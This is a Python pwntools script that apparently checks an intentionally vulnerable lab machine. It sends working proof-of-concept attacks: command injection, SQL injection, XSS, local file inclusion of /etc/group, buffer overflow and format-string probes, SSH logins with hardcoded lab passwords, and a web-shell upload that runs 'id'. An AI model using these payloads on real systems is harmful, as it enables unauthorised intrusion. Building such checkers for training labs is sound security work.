#!/usr/bin/python

from pwn import *
import re
import requests

class test_vulns():
    def test_cmd_injection(self, ip):
        """
        Test for command injection on port 2222
        @param ip: ip address of target
        """
        try:
            conn = remote(ip, 2222)
            prompt = conn.recv()
            log.debug(prompt)
            conn.send("ls;ls /home/\n")
            results = conn.recv()
        except:
            log.info("Error connecting to "+ ip)
            return False
        log.debug(results)
        conn.close()
        if "jackbauer" in results:
            log.info(ip+" VULNERABLE to cmd injection")
            return True
        else:
            log.info(ip+" NOT VULNERABLE cmd injection")
            return False


    def test_buffer_overflow(self, ip):
        """
        Test buffer overflow by sending a lot of A characters and checking for a segfault (ie. signal -11).
        Buffer overflow service is running on port 3333
        @param ip: ip address of target
        """
        try:
            conn = remote(ip, 3333)
            prompt = conn.recv()
            log.debug(prompt)
            overflow_string = "A"*600 + "\n"
            conn.send(overflow_string)
            results = ""
            results = conn.recv()
        except:
            log.info("Error connecting to"+ ip)
            return False
        conn.close()
        log.debug(results)
        if "-11" in results:
            log.info(ip+" VULNERABLE to buffer overflow")
            return True
        else:
            log.info(ip+" NOT VULNERABLE to buffer overflow")
            return False


    def test_ssh_default(self, ip, username, pw):
        """
        @param ip: ip address of target
        @param username: ssh username
        @oaram pw: password
        """
        try:
            shell = ssh(username, ip, password=pw)
            results = ""
            results = shell["whoami"]
        except:
            log.info("Failed to connect to ssh " + ip)
            return False
        log.debug(results)
        shell.close()
        if username in results:
            log.info(ip+" VULNERABLE to default ssh "+ username)
            return True
        else:
            log.info(ip+" NOT VULNERABLE to default ssh "+ username)
            return False

    def test_backdoor_1(self, ip):
        """
        Test netcat backdoor. Default backdoor is on port 33123
        but the backdoor port will decrement after each successful connection
        @param ip: ip address of target
        """
        for i in range(33123, 33103, -1):
            port = i
            try:
                conn = remote(ip, port)
                results = ""
                if conn:
                    conn.send("ls /home/\n")
                    results = conn.recv()
                    conn.close()
                if "jackbauer" in results:
                    log.info(ip+" VULNERABLE to backdoor 1")
                    return True
            except:
                pass

    def test_backdoor_2(self, ip):
        """
        Test the php backdoor that was left on the machine in the images folder
        @param ip: ip address of target
        """
        url = "http://" + ip + "/arbitrary_file_upload/images/shell.php?cmd=whoami"
        results = ""
        try:
            results = wget(url)
        except:
            log.info("Error connecting to backdoor 2 " + ip)
            return False
        if "www-data" in results:
            log.info(ip+" VULNERABLE to backdoor 2")
            return True
        else:
            log.info(ip+" NOT VULNERABLE to backdoor 2")
            return False

    def test_lfi(self, ip):
        """
        Test local file inclusion vulnerability. This can be checked by giving a full path
        and without using ../
        @param ip: ip address of target
        """
        url = "http://" + ip + "/lfi/lfi.php?language=/etc/group"
        try:
            results = wget(url)
        except:
            log.info("Error performing web request to ")
            return False
        if "surnow" in results:
            log.info(ip+" VULNERABLE to lfi")
            return True
        else:
            log.info(ip+" NOT VULNERABLE to lfi")
            return False

    def test_local_format_string(self, ip, username, pw):
        """
        Test for local format string vulnerability. This can be accessed by jackbauer, chloe, and surnow.
        To verify this vulnerability we can check to see if we can read data off of the stack
        @param ip: ip address of target
        @param username: username to login with over ssh
        @param pw: password to login with over ssh
        """
        try:
            shell = ssh(username, ip, password=pw)
        except:
            log.info("Failed to connect to local format string "+ ip)
            return False
        results = ""
        results = shell["/home/jackbauer/services/c/formatme_local/printf %x%x%x"]
        evaluation = re.match("[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]", results)
        log.info(results)
        shell.close()
        if evaluation:
            log.info(ip+" VULNERABLE to local format string")
            return True
        else:
            log.info(ip+" NOT VULNERABLE to local format string")
            return False

    def test_reflected_xss(self, ip):
        """
        Test for reflected cross-site scripting (XSS)
        @param ip: ip address of target
        """
        url = "http://" + ip + "/xss/xss.php?quote=<img%20src=x%20onerror=alert(1)>"
        results = ""
        try:
            results = wget(url)
        except:
            log.info("Error reflected XSS " + ip)
            return False
        log.info(results)
        if "<img src=x onerror=alert(1)>" in results:
            log.info(ip+" VULNERABLE to reflected xss")
            return True
        else:
            log.info(ip+" NOT VULNERABLE to reflected xss")
            return False

    def test_sqli(self, ip):
        """
        Test for SQL injection (SQLi)
        @param  ip: ip address of target
        """
        log.info("testing sqli on " + ip)
        #payload = {'codename_input':'B-Rabbit', 'submitted':'TRUE'}
        payload = {'codename_input':'a" or 2 LIKE 2-- ', 'submitted':'TRUE'}
        url = "http://" + ip + "/index.php"
        try:
            results = requests.post(url, data=payload)
            log.info(results.text)
        except:
            log.info("Failed to connect to sqli " + ip)
            return False
        if "Tibet" in results.text:
            return True
        else:
            return False

    def test_local_format_string_chloe(self, ip):
        self.test_local_format_string(ip, "chloe", "chloechloe")

    def test_dom_based_xss(self, ip):
        log.info("testing dom based xss")
        url = "http://" + ip + "/dom_based_xss/index.html"
        try:
            results = wget(url)
            log.info(results)
        except:
            log.info("Failed to connect to " + ip)
        if 'document.write("<a href=" + decodeURIComponent(document.baseURI)' in results:
            log.info(ip + " VULNERABLE to dom based XSS")
            return True
        else:
            return False

    def test_arbitrary_file_upload(self, ip):
        log.info("testing arbitrary file upload ")
        url = "http://" + ip + "/arbitrary_file_upload/upload.php"
        files = {'image': open('hacker_shell.php', 'rb')}
        try:
            results = requests.post(url, files=files)
            log.info(results.text)
        except:
            return False
        url2 = "http://" + ip + "/arbitrary_file_upload/images/hacker_shell.php?cmd=id"
        try:
            results2 = requests.get(url2)
            log.info(results2.text)
        except:
            return False
        if "www-data" in results2.text:
            log.info(ip+" VULNERABLE to arbitrary file upload")
            return True
        else:
            log.info(ip+" NOT VULNERABLE to arbitrary file upload")
            return False

    def test_ssh_jackbauer(self, ip):
        return self.test_ssh_default(ip, "jackbauer", "devgru6")

    def test_ssh_chloe(self, ip):
        return self.test_ssh_default(ip, "chloe", "chloechloe")

    def test_ssh_surnow(self, ip):
        return self.test_ssh_default(ip, "surnow", "surnowsurnow")

    def check_service(self, ip):
        return True


if __name__ == "__main__":
    ip_addr = "192.168.3.117"
    t = test_vulns()
    context.log_level = "info"
    t.test_arbitrary_file_upload(ip_addr)
    t.test_dom_based_xss(ip_addr)
    t.test_sqli(ip_addr)
    t.test_cmd_injection(ip_addr)
    t.test_buffer_overflow(ip_addr)
    t.test_ssh_jackbauer(ip_addr)
    t.test_ssh_chloe(ip_addr)
    t.test_ssh_surnow(ip_addr)
    t.test_backdoor_1(ip_addr)
    t.test_lfi(ip_addr)
    t.test_local_format_string_chloe(ip_addr)
    t.test_reflected_xss(ip_addr)

